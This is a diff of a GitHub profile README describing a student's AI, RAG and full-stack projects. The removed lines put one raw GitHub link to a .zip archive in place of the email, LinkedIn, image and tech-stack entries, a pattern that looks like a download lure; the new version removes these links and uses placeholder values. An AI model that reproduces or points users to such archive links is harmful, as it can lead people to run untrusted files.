@@ -1,118 +1,318 @@
-# Hi, I'm Raghul 👋  
-<!-- Typing SVG -->
+# <h1 align="center">Hi 👋, I'm Raghul Sekar</h1>
+
+<h3 align="center">
+Information Technology Student • AI/ML Developer • Full Stack Engineer
+</h3>
+
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip+Build.+I+Break.+I+Learn.;Code+with+Purpose.;Always+Improving.&center=true&width=480&height=40">
+Building AI-powered products that solve real-world problems.
 </p>
 
+---
 
-## 🧑‍💻 About Me
-I'm a **Information Technology** student with a strong interest in **Frontend and Backend Development, Machine Learning, and AI-powered systems**. I enjoy building real-world applications that combine clean backend logic with intelligent data processing.
+## 🚀 About Me
 
-- 🔍 Strengthening problem-solving skills using **DSA (C++ & Python)**
-- 🛠️ Building scalable backend systems using **Flask, FastAPI, Django**
-- 🤖 Working on **ML, RAG-based LLM applications**
-- 📊 Hands-on experience with real datasets and APIs
-- 🎯 Actively seeking **internship opportunities**
-- 💡 Consistent learner with a project-first mindset
+🎓 Information Technology Student passionate about Artificial Intelligence and Software Engineering.
+
+I enjoy building scalable applications that combine modern backend development with Machine Learning and Large Language Models.
+
+Currently focusing on:
+
+- 🤖 Large Language Models (LLMs)
+- 📄 RAG & Document Intelligence
+- 🧠 Machine Learning
+- ⚡ FastAPI & Flask Backend Development
+- 🌐 React Frontend Development
+- ☁️ Docker & Cloud Deployment
+- 📊 Data Structures & Algorithms (C++)
 
 ---
 
-## 🛠️ Tech Stack
+## 🔥 Current Focus
 
-### 💻 Languages
-- Python
-- C
-- C++  
-- Java  
-- JavaScript  
+✔ Advanced RAG Systems
 
-### 🌐 Backend & Full-Stack
-- Flask  
-- FastAPI  
-- Django  
-- https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip  
-- React
-- Html & CSS
+✔ Multi-document AI Assistants
 
-### 🧠 AI / Machine Learning
-- Scikit-learn  
-- Pandas  
-- NumPy  
-- SentenceTransformers
-- Sentiment Analysis
-- RAG (Retrieval-Augmented Generation)
+✔ AI Agents
 
-### 🗄️ Databases
-- MongoDB  
-- MySQL  
-- SQLite  
+✔ Retrieval Pipelines
 
-### 🧰 Tools & Others
-- Git & GitHub  
-- Docker  
-- Hugging Face Spaces  
-- REST APIs  
+✔ Backend Engineering
+
+✔ Full Stack Development
+
+✔ Machine Learning
+
+✔ System Design
 
 ---
 
-## 💼 Projects
+# 🛠 Tech Stack
 
-### 🌱 Agro Connect
-AI-driven full-stack platform designed to empower farmers with data-backed decision making.
+## Languages
 
-- Crop yield prediction using machine learning models  
-- Soil analysis insights for better crop planning  
-- Real-time weather analytics integration  
-- Interactive dashboards for clear data visualization  
-- Flask-based backend with MongoDB for secure data storage and access
-
-### 🔍 Insurance Query Chatbot (LLM + RAG)
-AI-powered chatbot that answers insurance-related questions from uploaded documents.
-
-- Document processing (PDF, DOCX, EML)
-- Vector search using ChromaDB & embeddings
-- LLaMA-3 via Groq API
-- Structured JSON responses with explanations
-- Deployed on Hugging Face Spaces
-
----
-
-### ❤️ Heart Disease Prediction System
-Machine learning web application for early heart disease risk prediction.
-
-- Logistic Regression model
-- Flask backend with trained `https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip`
-- Multi-step HTML forms with validation
-- User/Admin data handling
-- Clean UI with CSS & JavaScript
-
----
-
-### 🌦️ Smart Weather Dashboard
-Full-stack weather application with intelligent UI features.
-
-- City & geolocation-based weather search
-- 7-day forecast and calendar-based view
-- Local news integration
-- Dark/Light mode
-- Flask backend + modern frontend design
-
----
-
-## 📊 LeetCode Stats
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip" />
+<p>
+Python • C++ • Java • JavaScript • C
 </p>
 
+---
 
+## Frontend
+
+React
+
+HTML5
+
+CSS3
+
+JavaScript
+
+Responsive UI
 
 ---
 
-## 📫 Let's Connect
-- 📧 Email: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip  or https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip
-- 💼 LinkedIn: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip 
+## Backend
 
+FastAPI
+
+Flask
+
+Django
+
+REST APIs
+
+Authentication
 
 ---
 
-⭐ *Open to internships, collaborations, and learning opportunities.*
+## AI / Machine Learning
+
+Scikit-Learn
+
+Pandas
+
+NumPy
+
+Sentence Transformers
+
+Transformers
+
+HuggingFace
+
+RAG
+
+Vector Databases
+
+Prompt Engineering
+
+LLMs
+
+Document Intelligence
+
+Embeddings
+
+ChromaDB
+
+FAISS
+
+Groq API
+
+---
+
+## Databases
+
+MongoDB
+
+MySQL
+
+SQLite
+
+---
+
+## Dev Tools
+
+Git
+
+GitHub
+
+Docker
+
+Postman
+
+VS Code
+
+HuggingFace Spaces
+
+Gradio
+
+Linux
+
+---
+
+# 💼 Featured Projects
+
+## 🤖 Intelligent Insurance Document QA System
+
+An enterprise-grade Retrieval-Augmented Generation system capable of understanding insurance policies and answering natural language questions.
+
+### Features
+
+- Multi-document support
+- PDF
+- DOCX
+- Email (.eml)
+- Vector Search
+- ChromaDB
+- Sentence Embeddings
+- Groq Llama-3
+- Explainable JSON outputs
+- Clause Retrieval
+- Intelligent Context Ranking
+
+---
+
+## 🌾 Agro Connect
+
+AI-powered agriculture platform helping farmers make informed decisions.
+
+### Features
+
+- Crop Recommendation
+- Crop Yield Prediction
+- Soil Insights
+- Weather Analytics
+- Dashboard
+- MongoDB
+- Flask Backend
+
+---
+
+## 🧳 Smart Travel Planner
+
+Complete travel planning platform with itinerary generation and budgeting.
+
+### Features
+
+- Multi-city planning
+- Activity management
+- Budget estimation
+- Calendar visualization
+- Shareable itineraries
+- Relational Database Design
+
+---
+
+## ❤️ Heart Disease Prediction
+
+Machine Learning web application for predicting heart disease risk.
+
+### Features
+
+- Logistic Regression
+- Data Preprocessing
+- Flask
+- Authentication
+- Admin Dashboard
+- Responsive UI
+
+---
+
+## 🌦 Smart Weather Dashboard
+
+Modern weather platform with intelligent visualization.
+
+### Features
+
+- Geolocation Search
+- Weather Forecast
+- Interactive Dashboard
+- News Integration
+- Dark Mode
+
+---
+
+# 📚 Currently Learning
+
+- Advanced Machine Learning
+
+- Deep Learning
+
+- AI Agents
+
+- LangGraph
+
+- MCP
+
+- Distributed Systems
+
+- AWS
+
+- Kubernetes
+
+---
+
+# 🏆 Achievements
+
+🏅 Selected for Amazon ML Summer School 2026 Online Assessment
+
+🏅 Built multiple AI applications using LLMs
+
+🏅 Deployed AI applications on HuggingFace Spaces
+
+🏅 Active LeetCode Problem Solver
+
+---
+
+# 📈 GitHub Stats
+
+<p align="center">
+
+<img height="170" src="https://github-readme-stats.vercel.app/api?username=YOUR_USERNAME&show_icons=true&theme=tokyonight"/>
+
+<img height="170" src="https://github-readme-streak-stats.herokuapp.com/?user=YOUR_USERNAME&theme=tokyonight"/>
+
+</p>
+
+---
+
+# 💻 Most Used Languages
+
+<p align="center">
+
+<img src="https://github-readme-stats.vercel.app/api/top-langs/?username=YOUR_USERNAME&layout=compact&theme=tokyonight"/>
+
+</p>
+
+---
+
+# 📊 Activity Graph
+
+<p align="center">
+
+<img src="https://github-readme-activity-graph.vercel.app/graph?username=YOUR_USERNAME&theme=tokyo-night"/>
+
+</p>
+
+---
+
+# 🤝 Let's Connect
+
+📧 Email:
+your_email@gmail.com
+
+💼 LinkedIn:
+https://linkedin.com/in/yourprofile
+
+🌐 Portfolio:
+https://yourportfolio.com
+
+---
+
+# 💡 Quote
+
+> "Build. Break. Learn. Repeat."
+
+---
+
+⭐ If you like my work, consider giving a ⭐ to my repositories!
